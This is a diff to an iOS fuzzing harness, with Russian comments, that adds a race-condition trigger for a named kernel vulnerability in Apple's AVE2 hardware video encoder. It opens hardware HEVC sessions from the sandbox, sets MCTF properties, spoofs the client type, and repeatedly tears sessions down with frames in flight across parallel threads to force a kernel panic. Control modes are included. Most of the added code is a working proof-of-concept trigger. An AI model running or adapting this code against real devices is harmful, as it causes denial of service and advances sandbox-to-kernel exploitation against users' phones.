@@ -43260,6 +43260,375 @@ static void p_bq82(void) {
     LOG("[bq82] фоновый запуск...");
 }
 
+// p_bq83 — v239: CVE-2026-84607 RACE HAMMER (AppleAVE2 / MCTF). §231.
+// Реверс (декомпилят нашего 24A5390f): AVE_CHM_GetMCTFOutBuf заполняет
+// ТОЛЬКО plane-1 дескриптор вывода MCTF (plane-0 остаётся со stale/мусором
+// в kernel-памяти), а сброс order-счётчика SVESched+[0xa8] — условный и
+// поздний (success-ветка Config). Путь из песочницы (§231): VTCompressionSession
+// (HEVC, hardware) → ave.videoencoder (in-process, /System/Library/VideoCodecs/)
+// → IOServiceOpen("AppleAVE2Driver") → MakeFwCmd_Start → SetFwBuf → GetMCTFOutBuf;
+// MD::Reset — на реконфиге/смене frame number.
+// Триггер: активный MCTF-encode + teardown/реконфиг в момент in-flight кадров
+// (stale plane-0 дескриптор + гонка инвалидации порядка).
+// Детектор: kernel panic (DART fault / corruption) — устройство уходит в ребут.
+// Контроль §144 (прогонять ДО удара):
+//   FUZZ_BQ83_MODE=props — дамп supported properties + приём MCTF-ключей (без энкода);
+//   FUZZ_BQ83_MODE=long  — ОДНА сессия, много кадров, ожидание каждого (не должно падать);
+//   FUZZ_BQ83_MCTF=0     — те же циклы, MCTF-свойства НЕ ставим (не должно падать).
+// Удар: FUZZ_BQ83_MODE=cycle (default): N циклов create→encode(FRAMES, IDR каждые
+//   3 кадра, mid-stream реконфиг)→teardown mid-flight; FUZZ_BQ83_THREADS=2 —
+//   два параллельных клиента на одном HwC (общий SVESched/CHM).
+#import <pthread.h>
+#import <VideoToolbox/VideoToolbox.h>
+#import <CoreVideo/CoreVideo.h>
+#import <CoreMedia/CoreMedia.h>
+
+typedef struct {
+    dispatch_semaphore_t sem;
+    volatile int done;      // обработанные (callback) кадры
+    volatile int errs;      // callback с ошибкой
+    volatile int inflight;  // закодировано минус callback'и
+    volatile int sbs;        // успешных callback'ов с буфером
+} bq83_ctx;
+
+// NB: output CMSampleBuffer НЕ освобождаем: CFRelease в callback на iOS 27
+// даёт over-release trap (EXC_BREAKPOINT в CoreFoundation внутри VT-очереди
+// сразу после callback — краш-репорт fuzz27-2026-10-23-224446.ips). Утечка
+// ≤сотен буферов на фазу безвредна.
+static void bq83_out_cb(void *refcon, void *srcFrameRefCon, OSStatus st,
+                        VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
+    bq83_ctx *c = (bq83_ctx *)refcon;
+    (void)srcFrameRefCon; (void)flags;
+    if (st != noErr) {
+        c->errs++;
+        if (c->errs <= 5)
+            LOG("[bq83] out_cb err=%d flags=0x%x", (int)st, (unsigned)flags);
+    } else if (sb) {
+        c->sbs++;
+    }
+    c->done++;
+    c->inflight--;
+    dispatch_semaphore_signal(c->sem);
+}
+
+static int bq83_setnum(VTCompressionSessionRef s, CFStringRef key, long v) {
+    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
+    OSStatus st = VTSessionSetProperty(s, key, n);
+    CFRelease(n);
+    return (int)st;
+}
+
+static int bq83_setbool(VTCompressionSessionRef s, CFStringRef key, bool v) {
+    return (int)VTSessionSetProperty(s, key, v ? kCFBooleanTrue : kCFBooleanFalse);
+}
+
+// Спуф clientType через iChatUsageString (§231-разведка: FaceTime→0, CarPlay→1,
+// AirPlay→2, SafeView→3, ScreenSharing→4, MediaAnalysis→5, SideCar→7 — константы
+// ave.videoencoder; DevCap-таблица MCTF индексируется clientType×encType).
+static char g_bq83_usage[32] = "";
+
+// Ставит MCTF-набор (ключи из ave.videoencoder 24A5390f, §231); возвращает
+// количество принятых (noErr) свойств. verbose: лог каждой попытки.
+static int bq83_apply_mctf(VTCompressionSessionRef s, int strength, int cycle,
+                           int mctf_on, int verbose) {
+    int ok = 0, st;
+    if (g_bq83_usage[0]) {
+        CFStringRef u = CFStringCreateWithCString(kCFAllocatorDefault,
+                                                  g_bq83_usage, kCFStringEncodingUTF8);
+        st = (int)VTSessionSetProperty(s, CFSTR("iChatUsageString"), u);
+        CFRelease(u);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop iChatUsageString=%s -> %d", g_bq83_usage, st);
+    }
+    if (mctf_on) {
+        st = bq83_setbool(s, CFSTR("EnableMCTF"), true);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop EnableMCTF -> %d", st);
+        st = bq83_setnum(s, CFSTR("MCTFStrengthLevel"), strength);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFStrengthLevel=%d -> %d", strength, st);
+        st = bq83_setbool(s, CFSTR("MCTFEnableGating"), true);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFEnableGating -> %d", st);
+        st = bq83_setbool(s, CFSTR("MCTFEnableFeedback"), true);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFEnableFeedback -> %d", st);
+        st = bq83_setnum(s, CFSTR("MCTFEdgeCount"), 4);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFEdgeCount -> %d", st);
+        st = bq83_setnum(s, CFSTR("MCTFEdgeThresh"), 3);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFEdgeThresh -> %d", st);
+        st = bq83_setnum(s, CFSTR("MCTFLatencyMode"), 1 + (cycle % 2));
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop MCTFLatencyMode=%d -> %d", 1 + (cycle % 2), st);
+        st = bq83_setnum(s, CFSTR("TemporalNoiseReductionBand0Strength"), strength);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop TNRBand0=%d -> %d", strength, st);
+        st = bq83_setbool(s, CFSTR("AllowTemporalCompression"), true);
+        if (!st) ok++;
+        if (verbose) LOG("[bq83] prop AllowTemporalCompression -> %d", st);
+    } else if (verbose) {
+        LOG("[bq83] MCTF=0: MCTF-свойства не ставим (контроль)");
+    }
+    // общие: realtime, битрейт, IDR каждые 3 кадра (постоянная смена frame
+    // number — поверхность MCTFFnumChangeResetMCTF из фикса 27.0 GM)
+    bq83_setbool(s, CFSTR("RealTime"), true);
+    bq83_setnum(s, CFSTR("AverageBitRate"), 700000);
+    bq83_setnum(s, CFSTR("MaxKeyFrameInterval"), 3);
+    return ok;
+}
+
+// Создание hardware-HEVC сессии. Возвращает noErr/статус.
+static OSStatus bq83_create(VTCompressionSessionRef *out, int w, int h,
+                            bq83_ctx *c) {
+    const void *sk[] = { CFSTR("RequireHardware") };
+    const void *sv[] = { kCFBooleanTrue };
+    CFDictionaryRef spec = CFDictionaryCreate(kCFAllocatorDefault, sk, sv, 1,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, w, h,
+        kCMVideoCodecType_HEVC, spec, NULL, NULL, bq83_out_cb, c, out);
+    CFRelease(spec);
+    return st;
+}
+
+// Chroma-формат кадра: MCTF в ave.videoencoder может требовать конкретный
+// ("FIG: MCTF for ChromaFmt %d... not supported. Fail", §231-разведка).
+static OSType bq83_fmt_code(int fmt) {
+    switch (fmt) {
+    case 1: return kCVPixelFormatType_420YpCbCr8BiPlanarFullRange;
+    case 2: return kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange;
+    case 3: return kCVPixelFormatType_420YpCbCr8Planar;
+    default: return kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
+    }
+}
+
+static const char *bq83_fmt_name(int fmt) {
+    switch (fmt) {
+    case 1: return "NV12-f8";
+    case 2: return "P010-10b";
+    case 3: return "I420-8b";
+    default: return "NV12-v8";
+    }
+}
+
+// Один кадр: NV12 с движущимся паттерном (MCTF = motion-compensated) → encode.
+// iOS 27 SDK: VTCompressionSessionEncodeFrame принимает CVImageBufferRef напрямую.
+static OSStatus bq83_encode_one(VTCompressionSessionRef s, int w, int h,
+                                int f, int cy, bool *logged_err, int fmt) {
+    CVPixelBufferRef pb = NULL;
+    if (CVPixelBufferCreate(kCFAllocatorDefault, w, h,
+            bq83_fmt_code(fmt), NULL, &pb) != kCVReturnSuccess)
+        return kCVReturnError;
+    CVPixelBufferLockBaseAddress(pb, 0);
+    int planes = (int)CVPixelBufferGetPlaneCount(pb);
+    for (int p = 0; p < planes; p++) {
+        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, p);
+        size_t bh = CVPixelBufferGetHeightOfPlane(pb, p);
+        size_t bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, p);
+        uint8_t v = (uint8_t)((f * 37 + cy * 11 + p * 53) & 0xff);
+        for (size_t r = 0; r < bh; r++)
+            memset(base + r * bpr, v ^ (uint8_t)(r & 0x1f), bpr);
+    }
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+    VTEncodeInfoFlags info = 0;
+    OSStatus st = VTCompressionSessionEncodeFrame(s, pb,
+        CMTimeMake(1 + f + cy * 4096, 30), CMTimeMake(1, 30), NULL, NULL, &info);
+    CFRelease(pb);
+    if (st != noErr && !*logged_err) {
+        LOG("[bq83] первый EncodeFrame err=%d", (int)st);
+        *logged_err = true;
+    }
+    return st;
+}
+
+typedef struct {
+    int tid, ncycles, frames, w, h, mctf, fmt, reconf;
+    bq83_ctx *ctx;
+} bq83_thr;
+
+// Цикл гонки: create → MCTF → encode FRAMES кадров (без ожидания) →
+// teardown mid-flight. Каждый 3-й цикл — mid-stream реконфиг силы MCTF.
+static void *bq83_thread(void *arg) {
+    bq83_thr *t = (bq83_thr *)arg;
+    bq83_ctx *c = t->ctx;
+    bool logged_err = false;
+    for (int cy = 0; cy < t->ncycles; cy++) {
+        VTCompressionSessionRef s = NULL;
+        OSStatus st = bq83_create(&s, t->w, t->h, c);
+        if (st != noErr) {
+            LOG("[bq83] t%d c%d: create FAILED %d", t->tid, cy, (int)st);
+            usleep(200000);
+            continue;
+        }
+        int strength = 1 + ((cy * 7) % 20);   // 1..20 (лимит 0..24)
+        int okp = bq83_apply_mctf(s, strength, cy, t->mctf, cy < 2);
+        int encoded = 0;
+        for (int f = 0; f < t->frames; f++) {
+            // mid-stream реконфиг: смена силы MCTF пока кадры в полёте
+            if (t->mctf && f == t->frames / 2 && (cy % 3) == 1)
+                bq83_setnum(s, CFSTR("MCTFStrengthLevel"),
+                            1 + ((strength * 3) % 20));
+            // СТРУКТУРНЫЕ реконфиги mid-stream (part-2 гонки, §231):
+            // каждое свойство меняет GOP/структуру → внутренняя реконфигурация
+            // → kernel MD::Reset/Config против in-flight AVE_SVESched_Process.
+            if (t->reconf && (f & 1) == 0) {
+                bq83_setnum(s, CFSTR("MaxKeyFrameInterval"), (f & 2) ? 3 : 30);
+                bq83_setnum(s, CFSTR("NumberOfTemporalLayers"),
+                            (f & 4) ? 1 : 2);
+                bq83_setnum(s, CFSTR("AverageBitRate"),
+                            300000 + (f % 5) * 200000);
+            }
+            if (bq83_encode_one(s, t->w, t->h, f, cy, &logged_err, t->fmt) == noErr) {
+                encoded++;
+                c->inflight++;
+            }
+        }
+        // TEARDOWN mid-flight: НЕ ждём callback'и последних кадров —
+        // ядро ещё держит fw-команды/MCTF-поверхности, следующий Start
+        // читает state, который b4 чистит условно и поздно (§231).
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        if ((cy % 5) == 0 || cy == t->ncycles - 1)
+            LOG("[bq83] t%d c%d/%d okprops=%d encoded=%d done=%d errs=%d infl=%d",
+                t->tid, cy + 1, t->ncycles, okp, encoded, c->done, c->errs,
+                c->inflight);
+        usleep(5000);
+    }
+    return NULL;
+}
+
+static void bq83_dump_props(VTCompressionSessionRef s) {
+    CFDictionaryRef pd = NULL;
+    if (VTSessionCopySupportedPropertyDictionary(s, &pd) == noErr && pd) {
+        CFIndex n = CFDictionaryGetCount(pd);
+        const void **keys = malloc((size_t)n * sizeof(void *));
+        CFDictionaryGetKeysAndValues(pd, keys, NULL);
+        LOG("[bq83] supported properties: %ld", (long)n);
+        for (CFIndex i = 0; i < n; i++) {
+            char buf[128];
+            CFStringRef k = (CFStringRef)keys[i];
+            if (k && CFStringGetCString(k, buf, sizeof(buf), kCFStringEncodingUTF8))
+                LOG("[bq83]   prop: %s", buf);
+        }
+        free(keys);
+        CFRelease(pd);
+    } else {
+        LOG("[bq83] supported-property dictionary недоступна");
+    }
+}
+
+static void p_bq83(void) {
+    LOG("[bq83] v239: CVE-2026-84607 race hammer (AppleAVE2/MCTF), §231");
+    fsync(fileno(stderr));
+    const char *mode_s = getenv("FUZZ_BQ83_MODE");
+    if (!mode_s) mode_s = "cycle";
+    int mctf = getenv("FUZZ_BQ83_MCTF") ? atoi(getenv("FUZZ_BQ83_MCTF")) : 1;
+    int ncycles = getenv("FUZZ_BQ83_N") ? atoi(getenv("FUZZ_BQ83_N")) : 40;
+    int frames = getenv("FUZZ_BQ83_FRAMES") ? atoi(getenv("FUZZ_BQ83_FRAMES")) : 8;
+    int w = getenv("FUZZ_BQ83_W") ? atoi(getenv("FUZZ_BQ83_W")) : 1280;
+    int h = getenv("FUZZ_BQ83_H") ? atoi(getenv("FUZZ_BQ83_H")) : 720;
+    int nthreads = getenv("FUZZ_BQ83_THREADS") ? atoi(getenv("FUZZ_BQ83_THREADS")) : 1;
+    if (nthreads < 1) nthreads = 1;
+    if (nthreads > 2) nthreads = 2;
+    int fmt = getenv("FUZZ_BQ83_FMT") ? atoi(getenv("FUZZ_BQ83_FMT")) : 0;
+    const char *usage = getenv("FUZZ_BQ83_USAGE");
+    if (usage && usage[0]) {
+        strncpy(g_bq83_usage, usage, sizeof(g_bq83_usage) - 1);
+        g_bq83_usage[sizeof(g_bq83_usage) - 1] = 0;
+    }
+    LOG("[bq83] mode=%s mctf=%d n=%d frames=%d %dx%d threads=%d fmt=%s usage=%s",
+        mode_s, mctf, ncycles, frames, w, h, nthreads, bq83_fmt_name(fmt),
+        g_bq83_usage[0] ? g_bq83_usage : "-");
+
+    bq83_ctx *c = calloc(1, sizeof(*c));
+    c->sem = dispatch_semaphore_create(0);
+    bool logged_err = false;
+
+    if (!strcmp(mode_s, "props")) {
+        // Разведка-матрица: по каждому chroma-формату — hardware-HEVC сессия,
+        // приём MCTF-ключей, 3 кадра, статусы callbacks. Контекст v239: на
+        // NV12-v8 EnableMCTF/MCTFLatencyMode приняты, но каждый кадр падал
+        // с kVTSessionMalfunctionErr (-17691) — подозрение на "MCTF for
+        // ChromaFmt not supported" (строка ave.videoencoder).
+        for (int f_i = 0; f_i < 4; f_i++) {
+            VTCompressionSessionRef s = NULL;
+            OSStatus st = bq83_create(&s, w, h, c);
+            if (st != noErr) {
+                LOG("[bq83] props fmt=%s: create FAILED %d",
+                    bq83_fmt_name(f_i), (int)st);
+                continue;
+            }
+            int okp = bq83_apply_mctf(s, 12, 0, mctf, f_i == 0);
+            bool le = false;
+            int enc = 0;
+            int d0 = c->done, e0 = c->errs, s0 = c->sbs;
+            for (int f = 0; f < 3; f++) {
+                if (bq83_encode_one(s, w, h, f, f_i, &le, f_i) == noErr) {
+                    enc++;
+                    c->inflight++;
+                }
+            }
+            usleep(700000);
+            LOG("[bq83] props fmt=%s: okprops=%d enc=%d done+%d errs+%d sbs+%d",
+                bq83_fmt_name(f_i), okp, enc, c->done - d0,
+                c->errs - e0, c->sbs - s0);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            usleep(200000);
+        }
+    } else if (!strcmp(mode_s, "long")) {
+        // КОНТРОЛЬ: одна сессия, ждём каждый кадр — гонки нет по построению.
+        VTCompressionSessionRef s = NULL;
+        OSStatus st = bq83_create(&s, w, h, c);
+        if (st != noErr) {
+            LOG("[bq83] long: create FAILED %d", (int)st);
+        } else {
+            int okp = bq83_apply_mctf(s, 12, 0, mctf, true);
+            int total = ncycles * frames;
+            int encoded = 0;
+            for (int f = 0; f < total; f++) {
+                if (bq83_encode_one(s, w, h, f, 0, &logged_err, fmt) == noErr) {
+                    encoded++;
+                    c->inflight++;
+                    dispatch_semaphore_wait(c->sem,
+                        dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC));
+                }
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            LOG("[bq83] long: okprops=%d encoded=%d done=%d errs=%d",
+                okp, encoded, c->done, c->errs);
+        }
+    } else {
+        // УДАР: циклы с teardown mid-flight (+опц. 2 параллельных клиента).
+        bq83_thr t[2];
+        pthread_t th[2];
+        for (int i = 0; i < nthreads; i++) {
+            t[i].tid = i;
+            t[i].ncycles = ncycles;
+            t[i].frames = frames;
+            t[i].w = w;
+            t[i].h = h;
+            t[i].mctf = mctf;
+            t[i].fmt = fmt;
+            t[i].reconf = getenv("FUZZ_BQ83_RECONF") ? atoi(getenv("FUZZ_BQ83_RECONF")) : 0;
+            t[i].ctx = c;
+            pthread_create(&th[i], NULL, bq83_thread, &t[i]);
+        }
+        for (int i = 0; i < nthreads; i++)
+            pthread_join(th[i], NULL);
+    }
+
+    // дрен поздних callback'ов (до 10 c)
+    for (int i = 0; i < 100 && c->inflight > 0; i++)
+        usleep(100000);
+    LOG("[bq83] ИТОГ mode=%s mctf=%d fmt=%s: done=%d errs=%d sbs=%d inflight=%d "
+        "(устройство живо; panic = ушли в ребут)", mode_s, mctf,
+        bq83_fmt_name(fmt), c->done, c->errs, c->sbs, c->inflight);
+    fsync(fileno(stderr));
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -50768,6 +51137,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ80")) { p_bq80(); LOG("[probe13] bq80-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ81")) { p_bq81(); LOG("[probe13] bq81-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ82")) { p_bq82(); LOG("[probe13] bq82-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ83")) { p_bq83(); LOG("[probe13] bq83-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
